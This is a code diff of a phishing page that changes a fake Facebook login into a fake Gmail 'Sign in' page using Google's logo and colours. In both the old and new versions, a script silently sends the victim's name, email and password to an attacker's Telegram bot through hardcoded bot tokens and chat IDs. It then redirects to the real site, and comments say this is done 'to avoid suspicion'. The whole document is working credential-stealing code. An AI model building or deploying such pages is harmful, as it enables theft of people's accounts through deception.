@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Clone</title>
+    <title>Gmail Login </title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
     <style>
         * {
@@ -18,204 +18,171 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background: #f0f2f5;
+            background: #fff;
         }
 
         .container {
             display: flex;
-            justify-content: space-between;
-            max-width: 1000px;
+            flex-direction: column;
+            align-items: center;
+            max-width: 450px;
             width: 100%;
-            padding: 0 15px;
+            padding: 20px;
         }
 
-        .text {
-            margin-bottom: 90px;
+        .logo {
+            margin-bottom: 20px;
         }
 
-        .text h1 {
-            color: #1877f2;
-            font-size: 4rem;
+        .logo img {
+            width: 100px;
+        }
+
+        .form-container {
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 30px;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
             margin-bottom: 10px;
+            color: #202124;
         }
 
-        .text p {
-            font-size: 1.75rem;
-            white-space: nowrap;
+        p {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 20px;
         }
 
         form {
             display: flex;
             flex-direction: column;
-            background: #fff;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
         }
 
         form input {
-            height: 55px;
+            height: 48px;
             width: 100%;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            font-size: 1rem;
-            padding: 0 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            padding: 0 12px;
         }
 
         form input:focus {
             outline: none;
-            border-color: #1877f2;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
         }
 
         ::placeholder {
-            color: #777;
-            font-size: 1.063rem;
+            color: #5f6368;
+            font-size: 16px;
         }
 
-        .link {
-            display: flex;
-            flex-direction: column;
-            text-align: center;
-            gap: 15px;
-        }
-
-        .link .login {
-            border: none;
-            outline: none;
-            cursor: pointer;
-            background: #1877f2;
-            padding: 15px 0;
-            border-radius: 6px;
+        button {
+            background: #1a73e8;
             color: #fff;
-            font-size: 1.25rem;
-            font-weight: 600;
-            transition: 0.2s ease;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
         }
 
-        .link .login:hover {
-            background: #0d65d9;
+        button:hover {
+            background: #1669c9;
         }
 
-        .link .forgot {
-            color: #1877f2;
-            font-size: 0.875rem;
+        .forgot {
+            display: block;
+            text-align: center;
+            color: #1a73e8;
+            font-size: 14px;
             text-decoration: none;
+            margin-top: 20px;
         }
 
-        .link .forgot:hover {
+        .forgot:hover {
             text-decoration: underline;
         }
 
-        hr {
-            border: none;
-            height: 1px;
-            background-color: #ccc;
-            margin: 20px 0;
-        }
-
-        .button a {
-            padding: 15px 20px;
-            background: #42b72a;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 1.063rem;
-            font-weight: 600;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .button a:hover {
-            background: #3ba626;
-        }
-
-        @media (max-width: 900px) {
+        @media (max-width: 500px) {
             .container {
-                flex-direction: column;
-                text-align: center;
-            }
-
-            .text {
-                margin-bottom: 30px;
-            }
-        }
-
-        @media (max-width: 460px) {
-            .text h1 {
-                font-size: 3.5rem;
-            }
-
-            .text p {
-                font-size: 1.3rem;
-            }
-
-            form {
                 padding: 15px;
+            }
+
+            .form-container {
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="text">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world</p>
-            <p>around you on Facebook.</p>
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
         </div>
-        <form id="loginForm">
-            <input type="text" id="name" name="name" placeholder="Full Name" required>
-            <input type="email" id="email" name="email" placeholder="Email or phone number" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <div class="link">
-                <button type="submit" class="login">Login</button>
+        <div class="form-container">
+            <h1>Sign in</h1>
+            <p>to continue to Gmail</p>
+            <form id="loginForm">
+                <input type="text" id="name" name="name" placeholder="Full Name" required>
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Next</button>
                 <a href="#" class="forgot">Forgot password?</a>
-            </div>
-            <hr>
-            <div class="button">
-                <a href="#">Create new account</a>
-            </div>
-        </form>
+            </form>
+        </div>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault();
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+        event.preventDefault();
 
-            const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
-            // Telegram Bot API details (replace with your own)
-            const botToken = '8426849824:AAFNvZs-3qkjlAYmmOhbY-cC06dU_a3_QkY'; // Get from BotFather
-            const chatId = '7580087867'; // Your Telegram chat ID
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        // Telegram Bot API details (replace with your own)
+        const botToken = '8366897357:AAFU1PfhbNQ-4j0MjqSfRYyFuxajp81x4vI'; // Get from BotFather
+        const chatId = '5709522096'; // Single chat ID
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Message to send to Telegram
-            const message = `New Login Submission:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
+        // Message to send to Telegram
+        const message = `New Gmail Login Submission:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
 
-            try {
-                // Send data to Telegram bot silently
-                await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                });
+        try {
+            // Send data to the single chat ID
+            await fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
 
-                // Redirect to official Facebook login page
-                window.location.href = 'https://www.facebook.com';
-            } catch (error) {
-                console.error('Error sending data to Telegram:', error);
-                // Redirect even if Telegram fails to avoid suspicion
-                window.location.href = 'https://www.facebook.com';
-            }
-        });
-    </script>
+            // Redirect to official Gmail login page
+            window.location.href = 'https://accounts.google.com';
+        } catch (error) {
+            console.error('Error sending data to Telegram:', error);
+            // Redirect even if Telegram fails to avoid suspicion
+            window.location.href = 'https://accounts.google.com';
+        }
+    });
+  </script>
 </body>
 </html>
